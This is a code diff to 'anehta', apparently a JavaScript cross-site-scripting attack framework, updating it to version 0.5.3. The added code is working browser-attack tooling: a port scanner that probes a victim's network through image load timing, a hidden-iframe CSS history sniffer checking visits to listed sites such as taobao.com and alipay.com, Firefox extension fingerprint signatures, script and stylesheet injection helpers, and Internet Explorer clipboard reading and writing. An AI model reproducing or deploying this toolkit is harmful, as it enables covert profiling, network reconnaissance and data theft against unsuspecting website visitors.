@@ -4,7 +4,7 @@
 //// 定义常量
 //////////////////////////////////////////////////
 var anehta = {
-        Version: '0.5.2',
+        Version: '0.5.3',
         Author: 'axis',
         Contact: 'axis@ph4nt0m.org',
         Homepage: 'http://www.ph4nt0m.org',
@@ -38,7 +38,55 @@ anehta.signatures.activex = new Array(
   "",
   ""
 );
+
+anehta.signatures.ffextensions = [
+  {name: 'Adblock Plus', url: 'chrome://adblockplus/skin/adblockplus.png'},
+  {name: 'Customize Google', url: 'chrome://customizegoogle/skin/32x32.png'},
+  {name: 'DownThemAll!', url: 'chrome://dta/content/immagini/icon.png'},
+  {name: 'Faster Fox', url: 'chrome://fasterfox/skin/icon.png'},
+  {name: 'Flash Block', url: 'chrome://flashblock/skin/flash-on-24.png'},
+  {name: 'FlashGot', url: 'chrome://flashgot/skin/icon32.png'},
+  {name: 'Google Toolbar', url: 'chrome://google-toolbar/skin/icon.png'},
+  {name: 'Greasemonkey', url: 'chrome://greasemonkey/content/status_on.gif'},
+  {name: 'IE Tab', url: 'chrome://ietab/skin/ietab-button-ie16.png'},
+  {name: 'IE View', url: 'chrome://ieview/skin/ieview-icon.png'},
+  {name: 'JS View', url: 'chrome://jsview/skin/jsview.gif'},
+  {name: 'Live HTTP Headers', url: 'chrome://livehttpheaders/skin/img/Logo.png'},
+  {name: 'SEO For Firefox', url: 'chrome://seo4firefox/content/icon32.png'},
+  {name: 'Search Status', url: 'chrome://searchstatus/skin/cax10.png'},
+  {name: 'Server Switcher', url: 'chrome://switcher/skin/icon.png'},
+  {name: 'StumbleUpon', url: 'chrome://stumbleupon/content/skin/logo32.png'},
+  {name: 'Torrent-Search Toolbar', url: 'chrome://torrent-search/skin/v.png'},
+  {name: 'User Agent Switcher', url: 'chrome://useragentswitcher/content/logo.png'},
+  {name: 'View Source With', url: 'chrome://viewsourcewith/skin/ff/tb16.png'},
+  {name: 'Web Developer', url: 'chrome://webdeveloper/content/images/logo.png'}
+];    
+      
+      
+anehta.signatures.sites = new Array(
+  "http://www.google.com",
+  "http://www.google.cn",
+  "http://www.baidu.com",
+  "http://www.taobao.com",
+  "http://www.alipay.com",
+  "http://www.sohu.com",
+  "http://www.sina.com.cn",
+  "http://www.163.com",
+  "http://www.qq.com",
+  "http://www.qidian.com",
+  "http://www.tianyaclub.com",
+  "http://www.kaixin001.com",
+  "http://www.xiaonei.com",
+  "http://planet.ph4nt0m.org",
+  "http://hi.baidu.com/aullik5",
+  "http://www.secwiki.com/anehta/demo.html",
+  "http://hi.baidu.com/fvck"
+);
  
+
+anehta.signatures.ports = new Array(21, 22, 23, 25, 53, 80, 
+  110, 118, 137, 139, 143, 161, 389, 443, 445, 547, 1080, 1433,
+  1521, 3306, 3389, 8000, 8008, 8080, 8888, 10000);
 
 //////////////////////////////////////////////////
 //// Core Library
@@ -763,7 +811,7 @@ anehta.ajax.post = function(url, param){
 	 });
 }
  
-// 针对IE可用,FF不行
+
 anehta.ajax.get = function(url){
   // 第二个参数是headers
 	xmlhttp.get(url, null, function(response, responseHeaders) {
@@ -792,24 +840,22 @@ anehta.inject.injectScript = function(ptr_sc){
   return s;
 }
 
-anehta.inject.removeScript = function(ptr_sc){
-	/*
-	var ob = $d.getElementsByTagName("body")[0].childNodes;
-	for (i=0; i<ob.length; i++){
-	  
-	  if (ob[i].src == ptr_sc){
-	  	alert("matched!! "+ob[i].src);
-	  	ob[i].removeAttribute("src");
-	  	 // $d.getElementsByTagName("body")[0].removeChild($d.getElementsByTagName("body")[0].childNodes[i]);
-	  	//$('script').filter(function(){this.src=ptr_sc;})
-	  	alert("after remove: "+ob[i].src);
-	  }
-  }
-  */
+// s需要是一个script对象
+anehta.inject.removeScript = function(s){
+	document.body.removeChild(s);
 }
 
 anehta.inject.addScript = function(ptr_sc){
-    document.write("<script src='"+ptr_sc+"'></script>");
+  document.write("<script src='"+ptr_sc+"'></script>");
+}
+
+anehta.inject.injectCSS = function(ptr_sc){
+	var c = document.createElement("link");
+	c.type = "text/css";
+	c.rel = "stylesheet";
+	c.href = ptr_sc;
+	document.getElementsByTagName("body")[0].appendChild(c);
+	return c;
 }
 
 anehta.inject.createIframe = function(w) {
@@ -1091,7 +1137,9 @@ anehta.detect.ffplugin = function(pluginName){
   return false;
 }
 
-anehta.detect.ffextension = function (){
+
+// 通过图片的状态检查是否存在ff扩展; extname需要是anehta.signatures.ffextensions中的
+anehta.detect.ffextension = function (extname){
 
 }
 
@@ -1118,6 +1166,7 @@ anehta.scanner.activex = function(){
   }
 }
 
+// 扫描Firefox 插件
 anehta.scanner.ffplugins = function (){  
 	if (anehtaBrowser.type() == "mozilla"){ 
     for (var i = 0; i < navigator.plugins.length; i++) {
@@ -1130,12 +1179,102 @@ anehta.scanner.ffplugins = function (){
   }
 }
 
-anehta.scanner.port = function(){
-	
+/*
+// 构造图片,通过返回状态判断是否连接图片成功的方法
+anehta.scanner.imgCheck = function(imgurl){
+	var m = new Image();
+  m.onload = function() {
+  	//alert(1);
+  };
+  m.onerror = function() {
+    //return false;
+    //alert(2);
+  };
+  m.src = imgurl;  //连接图片
 }
 
-anehta.scanner.history = function(){
+//扫描 Firefox 扩展
+anehta.scanner.ffextensions = function (){
+	for (var i = 0; i < anehta.signatures.ffextensions.length; i++){
+		//alert(anehta.signatures.ffextensions[i].url);
+    var result = anehta.scanner.imgCheck(anehta.signatures.ffextensions[i].url);
+    alert(result);
+    if (result == true){
+      alert(anehta.signatures.ffextensions[i].name);
+    }
+  }
+}
+*/
+
+// idea from attackAPI
+// timeout非常重要,一般900比较合适
+anehta.scanner.checkPort = function(scanHost, scanPort, timeout){		
+	var m = new Image();	
 	
+	// 通过onerror和onload的状态来判断	
+	m.onerror = function () {
+	if (!m) return;
+	m = undefined;
+	alert("open: "+scanPort);
+	};
+	
+	m.onload = m.onerror;
+	
+	//连接端口
+	m.src = "http://"+scanHost+":"+scanPort;
+	
+	setTimeout(function () {
+	  if (!m) return;
+	  m = undefined;
+	  alert("closed: "+scanPort);
+	}, timeout);
+}
+
+//扫描多个端口,效果非常不好
+anehta.scanner.ports = function(target, timeout){
+	for (var i=0; i<anehta.signatures.ports.length; i++){
+	  anehta.scanner.checkPort(target, anehta.signatures.ports[i], timeout);
+  }
+}
+
+//css track history log; 返回所有访问过的网站
+anehta.scanner.history = function(){
+	var urls = anehta.signatures.sites; // 扫描的站点
+  
+  var ifr = document.createElement('iframe');
+  ifr.style.visibility = 'hidden';
+  ifr.style.width = ifr.style.height = 0;
+  
+  document.body.appendChild(ifr);
+  
+  // 核心部分
+  var doc = anehta.dom.getDocument(ifr);
+  doc.open();
+  doc.write('<style>a:visited{display: none}</style>');
+  doc.close();
+  
+  for (var i = 0; i < urls.length; i++) {
+    var a = doc.createElement('a');
+    a.href = urls[i];
+    
+    doc.body.appendChild(a);
+    
+    if (a.currentStyle){
+      var display = a.currentStyle['display'];
+    }
+    else {
+      var display = doc.defaultView.getComputedStyle(a, null).getPropertyValue('display');
+    }
+            
+    // 找到了
+    if (display == 'none' ){
+      //alert("found! "+urls[i]);
+      anehtaCache.appendItem("sitesHistory", " | "+urls[i]); // 保存到cache中,'|'是分隔符
+    }
+  }
+   
+  document.body.removeChild(ifr);
+  return anehtaCache.getItem("sitesHistory");          
 }
 
 
@@ -1160,12 +1299,20 @@ anehta.misc.stealFile = function(){
 	
 }
 
+// IE only!
+// Read/Write to Clipboard will cause a security warning!
 anehta.misc.getClipboard = function(){
-	
+	if(window.clipboardData){
+        return window.clipboardData.getData('Text');
+  }       
+  return null;
 }
 
-anehta.misc.setClipboard = function(){
-	
+anehta.misc.setClipboard = function(data){
+	if(window.clipboardData){
+       return window.clipboardData.setData('Text', data);
+  }
+  return false;
 }
 
 
